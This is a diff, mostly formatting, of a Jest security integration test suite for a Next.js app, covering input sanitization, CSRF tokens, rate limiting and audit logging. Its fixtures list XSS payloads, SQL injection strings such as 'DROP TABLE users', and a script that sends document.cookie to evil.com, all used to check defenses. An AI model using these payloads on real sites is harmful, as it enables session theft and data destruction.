@@ -1,4 +1,11 @@
-import { describe, it, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';
+import {
+  describe,
+  it,
+  expect,
+  beforeAll,
+  afterAll,
+  beforeEach,
+} from '@jest/globals';
 import { createMocks } from 'node-mocks-http';
 import { NextRequest, NextResponse } from 'next/server';
 import { RateLimiter } from '../../lib/rate-limiter';
@@ -17,18 +24,18 @@ describe('セキュリティ統合テスト', () => {
     rateLimiter = new RateLimiter({
       windowMs: 60 * 1000,
       maxRequests: 5,
-      message: 'Test rate limit exceeded'
+      message: 'Test rate limit exceeded',
     });
 
     csrfProtection = new CSRFProtection({
       tokenLength: 32,
-      tokenExpiry: 30 * 60 * 1000
+      tokenExpiry: 30 * 60 * 1000,
     });
 
     auditLogger = new AuditLogger({
       mongoUri: process.env.MONGODB_URI || 'mongodb://localhost:27017',
       databaseName: 'test_audit_db',
-      collectionName: 'test_audit_logs'
+      collectionName: 'test_audit_logs',
     });
   });
 
@@ -86,12 +93,12 @@ describe('セキュリティ統合テスト', () => {
         '<iframe src="javascript:alert(1)"></iframe>',
         '<svg onload="alert(1)">',
         '"><script>alert(1)</script>',
-        '\'"--;!\\x3cscript\\x3ealert(1)\\x3c/script\\x3e='
+        '\'"--;!\\x3cscript\\x3ealert(1)\\x3c/script\\x3e=',
       ];
 
-      maliciousInputs.forEach(input => {
+      maliciousInputs.forEach((input) => {
         const sanitized = InputSanitizer.sanitize(input, {
-          type: SanitizationType.STRICT
+          type: SanitizationType.STRICT,
         });
 
         expect(sanitized).not.toContain('<script');
@@ -108,12 +115,12 @@ describe('セキュリティ統合テスト', () => {
         "'; DROP TABLE users; --",
         "' OR '1'='1",
         "1' UNION SELECT * FROM users--",
-        "'; DELETE FROM posts WHERE '1'='1"
+        "'; DELETE FROM posts WHERE '1'='1",
       ];
 
-      sqlInjectionInputs.forEach(input => {
+      sqlInjectionInputs.forEach((input) => {
         const sanitized = InputSanitizer.sanitize(input, {
-          type: SanitizationType.STRICT
+          type: SanitizationType.STRICT,
         });
 
         expect(sanitized).not.toContain('DROP TABLE');
@@ -128,14 +135,14 @@ describe('セキュリティ統合テスト', () => {
         username: 'user123',
         email: 'test@example.com',
         content: 'これは正常な投稿内容です。',
-        url: 'https://example.com'
+        url: 'https://example.com',
       };
 
       const configs = {
         username: { type: SanitizationType.USERNAME, maxLength: 50 },
         email: { type: SanitizationType.EMAIL, maxLength: 254 },
         content: { type: SanitizationType.POST_CONTENT, maxLength: 1000 },
-        url: { type: SanitizationType.URL, maxLength: 2048 }
+        url: { type: SanitizationType.URL, maxLength: 2048 },
       };
 
       const result = InputSanitizer.sanitizeBatch(validInputs, configs);
@@ -170,7 +177,9 @@ describe('セキュリティ統合テスト', () => {
 
       // 異なるセッションID
       const differentSessionId = 'different-session';
-      expect(csrfProtection.verifyToken(validToken, differentSessionId)).toBe(false);
+      expect(csrfProtection.verifyToken(validToken, differentSessionId)).toBe(
+        false
+      );
 
       // 空のトークン
       expect(csrfProtection.verifyToken('', sessionId)).toBe(false);
@@ -179,14 +188,14 @@ describe('セキュリティ統合テスト', () => {
     it('期限切れトークンは拒否される', async () => {
       // 短い有効期限でテスト用インスタンス作成
       const shortLivedCSRF = new CSRFProtection({
-        tokenExpiry: 100 // 100ms
+        tokenExpiry: 100, // 100ms
       });
 
       const sessionId = 'test-session';
       const token = shortLivedCSRF.generateToken(sessionId);
 
       // 少し待って期限切れにする
-      await new Promise(resolve => setTimeout(resolve, 150));
+      await new Promise((resolve) => setTimeout(resolve, 150));
 
       const isValid = shortLivedCSRF.verifyToken(token, sessionId);
       expect(isValid).toBe(false);
@@ -223,7 +232,7 @@ describe('セキュリティ統合テスト', () => {
           ipAddress: '192.168.1.100',
           userAgent: 'Test Browser',
           success: false,
-          errorMessage: 'Invalid credentials'
+          errorMessage: 'Invalid credentials',
         },
         {
           action: AuditAction.RATE_LIMIT_EXCEEDED,
@@ -231,7 +240,7 @@ describe('セキュリティ統合テスト', () => {
           ipAddress: '192.168.1.101',
           userAgent: 'Test Browser',
           resource: '/api/posts',
-          success: false
+          success: false,
         },
         {
           action: AuditAction.CSRF_VIOLATION,
@@ -239,8 +248,8 @@ describe('セキュリティ統合テスト', () => {
           ipAddress: '192.168.1.102',
           userAgent: 'Test Browser',
           resource: '/api/posts',
-          success: false
-        }
+          success: false,
+        },
       ];
 
       // イベントをログに記録
@@ -249,12 +258,12 @@ describe('セキュリティ統合テスト', () => {
       }
 
       // 少し待ってからクエリ
-      await new Promise(resolve => setTimeout(resolve, 100));
+      await new Promise((resolve) => setTimeout(resolve, 100));
 
       // 記録されたログを検索
       const logs = await auditLogger.search({
         level: AuditLevel.WARN,
-        limit: 10
+        limit: 10,
       });
 
       expect(logs.length).toBeGreaterThanOrEqual(2);
@@ -267,14 +276,14 @@ describe('セキュリティ統合テスト', () => {
         ipAddress: '192.168.1.200',
         userAgent: 'Malicious Bot',
         success: false,
-        details: { attemptedPayload: '<script>alert(1)</script>' }
+        details: { attemptedPayload: '<script>alert(1)</script>' },
       };
 
       await auditLogger.log(highRiskEvent.action, highRiskEvent);
 
       const logs = await auditLogger.search({
         action: AuditAction.XSS_ATTEMPT,
-        limit: 1
+        limit: 1,
       });
 
       expect(logs.length).toBe(1);
@@ -297,7 +306,7 @@ describe('セキュリティ統合テスト', () => {
       // 3. 入力サニタイゼーションテスト
       const userInput = '<script>alert("test")</script>Valid content';
       const sanitized = InputSanitizer.sanitize(userInput, {
-        type: SanitizationType.POST_CONTENT
+        type: SanitizationType.POST_CONTENT,
       });
       expect(sanitized).not.toContain('<script>');
       expect(sanitized).toContain('Valid content');
@@ -308,7 +317,7 @@ describe('セキュリティ統合テスト', () => {
         ipAddress: ip,
         userAgent: 'Integration Test',
         resourceId: 'post456',
-        success: true
+        success: true,
       });
 
       // すべてのセキュリティレイヤーが正常に動作
@@ -330,16 +339,20 @@ describe('セキュリティ統合テスト', () => {
       expect(blockedAttempts).toBeGreaterThan(0);
 
       // 2. XSS攻撃の試行
-      const xssPayload = '"><script>document.location="http://evil.com?cookie="+document.cookie</script>';
+      const xssPayload =
+        '"><script>document.location="http://evil.com?cookie="+document.cookie</script>';
       const sanitizedXSS = InputSanitizer.sanitize(xssPayload, {
-        type: SanitizationType.STRICT
+        type: SanitizationType.STRICT,
       });
       expect(sanitizedXSS).not.toContain('<script>');
       expect(sanitizedXSS).not.toContain('document.location');
 
       // 3. CSRF攻撃の試行
       const validToken = csrfProtection.generateToken('legitimate-session');
-      const csrfAttack = csrfProtection.verifyToken(validToken, 'attacker-session');
+      const csrfAttack = csrfProtection.verifyToken(
+        validToken,
+        'attacker-session'
+      );
       expect(csrfAttack).toBe(false);
 
       // 4. 攻撃の監査ログ記録
@@ -351,16 +364,16 @@ describe('セキュリティ統合テスト', () => {
           attackType: 'multi-vector',
           rateLimitViolations: blockedAttempts,
           xssAttempt: true,
-          csrfAttempt: true
+          csrfAttempt: true,
         },
-        success: false
+        success: false,
       });
 
       // 攻撃が記録されたか確認
       const attackLogs = await auditLogger.search({
         ipAddress: attackerIP,
         level: AuditLevel.CRITICAL,
-        limit: 1
+        limit: 1,
       });
       expect(attackLogs.length).toBeGreaterThanOrEqual(1);
     });
